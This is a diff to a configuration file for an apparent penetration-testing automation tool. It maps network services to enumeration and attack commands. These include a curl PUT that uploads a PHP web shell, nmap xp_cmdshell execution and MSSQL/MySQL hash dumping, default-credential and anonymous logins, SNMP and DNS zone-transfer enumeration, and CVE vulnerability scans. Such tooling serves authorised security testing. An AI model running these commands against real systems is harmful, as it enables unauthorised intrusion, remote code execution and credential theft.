@@ -1,7 +1,6 @@
 # see: https://packetstormsecurity.com/files/18307/nmap-services.html
-# TODO: msrdp/ms-wbt-server, snmp,  msrpc, ipp, java-rmi,
-#       vnc/vnc-http, oracle-tns, kerberos-sec, ldap,
-#       imap/imap3/imaps, https, ssl/http, ssl/http-alt
+# TODO: msrdp/ms-wbt-server, ipp, java-rmi, vnc/vnc-http, oracle-tns,
+#       kerberos-sec, imap/imap3/imaps, https, ssl/http, ssl/http-alt
 # Commands accept arguments: <port>/<ports>, <target>, <fout>,
 #                            <wordlist>, <userlist>, <passlist>
 # If <port> is used instead of <ports>, then a separate entry for each
@@ -16,7 +15,7 @@
   ]
 
   recommendations = [
-    # TODO
+    # none
   ]
 
   [ftp.scans]
@@ -29,11 +28,11 @@
   ]
 
   recommendations = [
-    # TODO
+    # none
   ]
 
   [ssh.scans]
-    # TODO
+    nmap = "nmap -vv -Pn -p <ports> --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <target> -oN <fout>"
 
 
 [telnet]  # 23
@@ -42,11 +41,11 @@
   ]
 
   recommendations = [
-    # TODO
+    "telnet <target> <port>"
   ]
 
   [telnet.scans]
-    # TODO
+    nmap = "nmap -vv -Pn -p <ports> --script=telnet-encryption,telnet-ntlm-info <target> -oN <fout>"
 
 
 [smtp]  # 25
@@ -55,11 +54,12 @@
   ]
 
   recommendations = [
-    # TODO
+    "telnet <target> <port>"
   ]
 
   [smtp.scans]
-    # TODO
+    nmap = "nmap -vv -Pn -p <ports> --script=smtp-ntlm-info,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 <target> -oN <fout>"
+    smtpuserenum = "smtp-user-enum -M VRFY -U <userlist> -t <target> 2>&1 | tee <fout>"
 
 
 [dns]  # 53
@@ -68,11 +68,13 @@
   ]
 
   recommendations = [
-    # TODO
+    "nslookup"
   ]
 
   [dns.scans]
-    # TODO
+    dnsrecon = "dnsrecon -t axfr <target> 2>&1 | tee <fout>"
+    host = "host -t ns <target> 2>&1 | tee <fout>"
+    nmap = "nmap -v -Pn -p <ports> --script=dns-service-discovery,dns-cache-snoop,dns-check-zone,dns-zone-transfer <target> -oN <fout>"
 
 
 [http]  # 80, 591
@@ -85,7 +87,10 @@
     "curl -v -X OPTIONS http://<target>:<port>/<directory>",
     "curl -v -X PUT -d '<?php echo shell_exec($_GET[\"cmd\"]);?>' http://<target>:<port>/<directory>/webshell.php",
     "dirb http://<target>:<port>/",
-    "dotdotpwn -m http -h <target> -x <port> -f <pathtoretrieve> -k <keywordthatmustbepresent> -d <depth> -t <millisperrequest> -s"
+    "dotdotpwn -m http -h <target> -x <port> -f <pathtoretrieve> -k <keywordthatmustbepresent> -d <depth> -t <millisperrequest> -s",
+    "wafw00f http://<target>:/<port>/",
+    "nmap -Pn -p <ports> --script http-adobe-coldfusion-apsa1301,http-coldfusion-subzero,http-vuln-cve2009-3960,http-vuln-cve2010-2861 <target> -oN <fout>",
+    "wpscan --url http://<target>:<port>/"
   ]
 
   [http.scans]
@@ -107,15 +112,14 @@
     # TODO
 
 
-[smb]  # 135, 139, 445
+[smb]  # 139, 445
   nmap-service-names = [
-    "epmap",  # TODO: this might make more sense with MS-RPC
     "microsoft-ds",
     "netbios-ssn"
   ]
 
   recommendations = [
-    "nmap -vv -sU --script=nbstat -p <ports>",
+    "nmap -vv -sU --script=nbstat -p <ports> <target>",
     "crackmapexec smb <target> -u <user> -p <pass> --spider C\\$ --pattern <pattern>",
     "crackmapexec smb <target> -u '' -p ''",
     "crackmapexec smb <target> -u '' -p '' --local-auth",
@@ -128,6 +132,53 @@
     enum4linux = "enum4linux -a <target> 2>&1 | tee <fout>"
 
 
+[msrpc]
+  nmap-service-names = [
+    "epmap",
+    "msrpc",
+    "rpcbind",
+    "sunrpc",
+    "erpc"
+  ]
+
+  recommendations = [
+    "rpcclient -U '' <target>",
+    "rpcinfo -p <target>",
+    "showmount -e <target>"
+  ]
+
+  [msrpc.scans]
+    nmap = "nmap -vv -Pn -p <ports> --script=msrpc-enum <target> -oN <fout>"
+
+
+[snmp]  # 161
+  nmap-service-names = [
+    "snmp"
+  ]
+
+  recommendations = [
+    # none
+  ]
+
+  [snmp.scans]
+    nmap = "nmap -vv -Pn -p <ports> --script=snmp-netstat,snmp-processes <target> -oN <fout>"
+    onesixtyone = "onesixtyone <target> 2>&1 | tee <fout>"
+    snmpwalk = "snmpwalk -c public -v1 <target> 2>&1 | tee <fout>"
+
+
+[ldap]
+  nmap-service-names = [
+    "ldap"
+  ]
+
+  recommendations = [
+    # none
+  ]
+
+  [ldap.scans]
+    enum4linux = "enum4linux -l <target> 2>&1 | tee <fout>"
+
+
 [mssql]  # 1433, 1434
   nmap-service-names = [
     "ms-sql",
@@ -136,11 +187,12 @@
 
   recommendations = [
     "nmap -vv -Pn -p <port> --script=ms-sql-dump-hashes --script-args='mssql.username=<user>,mssql.password=<password>,mssql.instance-port=<port>' <target>",
-    "nmap -vv -Pn -p <port> --script ms-sql-xp-cmdshell --script-args='mssql.username=<user>,mssql.password=<password>,mssql.instance-port=<port>,ms-sql-xp-cmdshell.cmd=\"<cmd>\"' <target>"
+    "nmap -vv -Pn -p <port> --script ms-sql-xp-cmdshell --script-args='mssql.username=<user>,mssql.password=<password>,mssql.instance-port=<port>,ms-sql-xp-cmdshell.cmd=\"<cmd>\"' <target>",
+    "sqsh -S <target>:<port> -U <user>"
   ]
 
   [mssql.scans]
-    # TODO
+    # none
 
 
 [mysql]  # 3306
@@ -149,8 +201,8 @@
   ]
 
   recommendations = [
-    "TODO"
+    "mysql -u root -proot <target>"
   ]
 
   [mysql.scans]
-    # TODO
+    nmap = "nmap -vv -Pn --script=mysql-variables,mysql-vuln-cve2012-2122,mysql-info,mysql-users,mysql-enum,mysql-databases,mysql-dump-hashes <target> -oN <fout>"
